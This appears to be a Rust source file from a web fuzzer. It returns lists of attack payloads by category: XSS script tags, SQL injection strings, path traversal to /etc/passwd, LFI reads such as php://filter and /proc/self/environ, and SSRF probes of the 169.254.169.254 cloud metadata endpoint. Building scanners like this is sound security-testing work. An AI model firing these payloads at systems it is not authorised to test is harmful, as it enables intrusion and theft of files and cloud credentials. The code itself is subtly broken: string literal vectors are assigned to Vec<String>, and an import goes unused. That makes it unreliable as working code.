//! Chooses fuzzing payloads based on category or AI hints

use std::collections::HashMap;

pub enum PayloadCategory {
    XSS,
    SQLi,
    PathTraversal,
    LFI,
    SSRF,
    All,
}

pub fn get_payloads(category: PayloadCategory) -> Vec<String> {
    let mut payloads = vec![];

    match category {
        PayloadCategory::XSS => {
            payloads = vec![
                "<script>alert(1)</script>",
                "\" onerror=alert(1) x=\"",
                "<img src=x onerror=alert(1)>",
            ];
        }
        PayloadCategory::SQLi => {
            payloads = vec![
                "' OR 1=1 --",
                "' UNION SELECT NULL,NULL --",
                "' AND SLEEP(5) --",
            ];
        }
        PayloadCategory::PathTraversal => {
            payloads = vec![
                "../../../../etc/passwd",
                "..\\..\\windows\\win.ini",
                "..%2f..%2f..%2fetc/passwd",
            ];
        }
        PayloadCategory::LFI => {
            payloads = vec![
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
            ];
        }
        PayloadCategory::SSRF => {
            payloads = vec![
                "http://127.0.0.1:80",
                "http://localhost/admin",
                "http://169.254.169.254/latest/meta-data/",
            ];
        }
        PayloadCategory::All => {
            payloads = [
                get_payloads(PayloadCategory::XSS),
                get_payloads(PayloadCategory::SQLi),
                get_payloads(PayloadCategory::PathTraversal),
                get_payloads(PayloadCategory::LFI),
                get_payloads(PayloadCategory::SSRF),
            ]
            .concat();
        }
    }

    payloads
}
